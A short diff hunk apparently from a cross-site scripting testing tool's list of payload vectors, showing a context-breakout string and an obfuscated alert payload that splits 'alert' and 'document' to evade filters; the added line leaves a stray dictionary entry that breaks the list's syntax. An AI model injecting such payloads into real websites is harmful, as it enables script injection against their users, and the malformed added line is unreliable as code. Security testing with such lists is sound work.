@@ -2871,4 +2871,5 @@ vectors = [	{ 'payload':'''">PAYLOAD''',
           'browser':"""All"""},
         { 'payload':'''';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//''',
           'browser':"""All - for JS string context"""}
+          'browser':"""Not Info"""}
 ]
